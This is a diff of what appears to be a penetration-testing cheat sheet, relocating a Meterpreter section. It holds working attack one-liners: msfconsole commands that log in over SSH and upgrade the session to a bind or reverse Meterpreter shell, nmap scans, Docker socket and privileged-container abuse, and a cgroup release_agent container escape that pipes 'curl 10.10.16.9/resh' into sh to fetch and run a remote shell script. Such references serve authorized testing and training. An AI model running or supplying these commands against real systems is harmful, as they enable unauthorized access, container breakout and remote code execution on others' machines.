@@ -1401,6 +1401,11 @@ sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_
 sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_$TARGET__24'
 sudo nmap -n -Pn -sS '$TARGET/24' --excludefile hosts_ -F --open --max-rate 50 -oA 'TCP_ALL_$TARGET__24'
 
+[*] Meterpreter
+msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/bind_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/bind_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run'
+
+msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/reverse_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run;'
+
 [*] Containers
 +---------- Docker ----------+
 curl -s --unix-socket /var/run/docker.sock http:/./images/json
@@ -1428,11 +1433,6 @@ docker run -v /:/mnt --rm --privileged REPOSITORY chroot /mnt bash -c 'curl 10.1
 +---------- Privileged: True ----------+
 cat docker-compose.yml | grep 'privileged: true'
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`;mkdir -p $d/w;echo 1 >$d/w/notify_on_release;t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`;echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl 10.10.16.9/resh | sh' >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
-
-[*] Meterpreter
-msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/bind_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/bind_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run'
-
-msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/reverse_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run;'
 
 [*] Shells
 +---------- One Liners ----------+
